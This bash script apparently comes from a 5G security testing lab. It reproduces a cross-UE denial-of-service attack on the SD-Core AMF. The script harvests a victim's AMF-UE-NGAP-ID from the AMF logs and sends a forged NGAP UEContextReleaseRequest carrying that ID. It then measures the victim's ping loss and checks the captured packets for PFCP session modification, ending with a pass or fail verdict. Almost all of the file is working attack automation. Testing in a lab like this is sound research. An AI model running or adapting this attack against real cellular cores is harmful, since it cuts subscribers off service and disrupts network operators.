#!/usr/bin/env bash
# ==========================================================================
# STRICT reproduction of T06 — SD-Core UEContextReleaseRequest cross-UE release
# ==========================================================================
# Why this exists: the earlier sdcore_T06 pcap showed the attacker's request but
# NO victim impact (no NGAP 41, no PFCP SessMod) — the forged AMF-UE-NGAP-ID had
# not hit an active victim. This script removes that gap:
#   1. guarantees a fresh, REGISTERED, ACTIVELY-PINGING victim (aborts if not),
#   2. reads the victim's CURRENT AMF-UE-NGAP-ID,
#   3. measures victim ping loss ACROSS the attack window,
#   4. decodes the decisive evidence: where NGAP 41 goes + whether a PFCP
#      Session Modification (UP deactivation) fires,
#   5. prints an explicit PASS / PARTIAL / FAIL verdict.
# Uses the fixed builder (cause = radioNetwork/user-inactivity).
# Overwrites pcap/sdcore_T06_ue_release_victim_disconnect/ in place.
#
# Run from ngap_tester/ with Docker + the SD-Core kind cluster up. Git Bash / bash.
set -uo pipefail
cd "$(dirname "$0")"

DIR="sdcore_T06_ue_release_victim_disconnect"
UE="ueransim-sdcore-ueransim-ue-1"
GNB="ueransim-sdcore-ueransim-gnb-1"
NODE="sdcore-control-plane"          # kind node netns that sees the AMF pod's N2
PING_IF="uesimtun0"
POST=30
ABS="$(pwd)/pcap/$DIR"

log(){ echo -e "\033[1;36m[t06]\033[0m $*"; }
die(){ echo -e "\033[1;31m[t06][ABORT]\033[0m $*"; exit 2; }
tsh(){ MSYS_NO_PATHCONV=1 docker run --rm -v "$ABS:/cap" nicolaka/netshoot tshark "$@" 2>/dev/null; }
num(){ local x="$1"; [[ "$x" =~ ^[0-9]+$ ]] && echo "$x" || echo "-1"; }

# 1. RAN up ---------------------------------------------------------------
log "ensuring SD-Core RAN is up ..."
( cd ../5g-lab && ./scripts/ran.sh up ueransim sdcore ) || true
kubectl get pods -n sdcore 2>/dev/null | grep -E 'amf|smf|upf' || true

# 2. Fresh, registered, ACTIVE victim ------------------------------------
log "restarting victim UE for a fresh registration ..."
docker restart "$UE" >/dev/null || die "cannot restart UE '$UE'"
sleep 14

log "baseline connectivity check — victim MUST be online or the test is void ..."
BASE=$(num "$(docker exec "$UE" ping -I "$PING_IF" -c 5 -W 2 8.8.8.8 2>/dev/null \
        | grep -oE '[0-9]+% packet loss' | grep -oE '^[0-9]+')")
log "baseline packet loss: ${BASE}%"
{ [ "$BASE" -lt 0 ] || [ "$BASE" -ge 60 ]; } && \
  die "victim not active before attack (baseline loss ${BASE}%). Fix UE / PDU session first."

# 3. Fresh victim AMF-UE-NGAP-ID -----------------------------------------
V=$(kubectl logs -n sdcore -l app=amf --tail=400 2>&1 \
    | grep -oE 'AMF_UE_NGAP_ID:[0-9]+' | tail -1 | grep -oE '[0-9]+')
[ -z "${V:-}" ] && die "could not read victim AMF-UE-NGAP-ID from AMF logs"
GNB_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$GNB" 2>/dev/null)
log "victim AMF-UE-NGAP-ID = $V    victim gNB IP = ${GNB_IP:-?}"

# 4. Continuous victim ping across the whole window (background) ----------
log "starting victim ping across attack window ..."
docker exec "$UE" ping -I "$PING_IF" -c 70 -i 0.5 -W 2 8.8.8.8 >/tmp/t06_ping.log 2>&1 &
PING_PID=$!
trap 'kill $PING_PID 2>/dev/null' EXIT

# 5. Capture + fire (fixed builder: cause=user-inactivity) ----------------
export AMF_FILTER='sctp or (udp port 8805) or (udp port 2152) or (tcp portrange 8000-9100) or (tcp port 29518)'
CFG_CORE=sdcore ./capture_attack.sh "$DIR" "$NODE" - "$GNB" kind "$POST" \
    -- ue-release --amf-ue-id "$V" --ran-ue-id 99

# 6. Stop ping, compute loss ---------------------------------------------
wait $PING_PID 2>/dev/null
trap - EXIT
LOSS=$(num "$(grep -oE '[0-9]+% packet loss' /tmp/t06_ping.log | grep -oE '^[0-9]+' | tail -1)")
log "victim ping loss across window: ${LOSS}%  (baseline ${BASE}%)"
log "ping tail:"; tail -12 /tmp/t06_ping.log | sed 's/^/    /'

# 7. Decode decisive evidence --------------------------------------------
log "decoding evidence from the updated pcap ..."
REL_DST=$(tsh -r /cap/amf_ngap_nas_sbi.pcap -Y "ngap.procedureCode==41" -T fields -e ip.dst | sort -u | tr '\n' ' ')
PFCP_MOD=$(tsh -r /cap/amf_ngap_nas_sbi.pcap -Y "pfcp.msg_type==54" -T fields -e frame.number | grep -c . )

# 8. Verdict --------------------------------------------------------------
echo   "----------------------------------------------------------------"
echo   "  T06 SD-Core — STRICT RESULT"
echo   "  victim AMF-UE-NGAP-ID : $V"
echo   "  baseline / window loss: ${BASE}% -> ${LOSS}%"
echo   "  NGAP 41 dest IP(s)    : ${REL_DST:-<none>}   (victim gNB = ${GNB_IP:-?})"
echo   "  PFCP SessMod (type 54): $PFCP_MOD"
if [ "$LOSS" -ge 50 ] && { [ "$PFCP_MOD" -ge 1 ] || echo " $REL_DST " | grep -q " ${GNB_IP:-_none_} "; }; then
  echo "  VERDICT: PASS    — victim lost service AND the core acted on the forged request"
elif [ "$LOSS" -ge 50 ]; then
  echo "  VERDICT: PARTIAL — victim lost service, but no SessMod / no 41-to-victim-gNB captured"
else
  echo "  VERDICT: FAIL    — no victim impact; SD-Core did not act (likely ID/state precondition)"
fi
echo   "  pcap updated: pcap/$DIR/"
echo   "----------------------------------------------------------------"
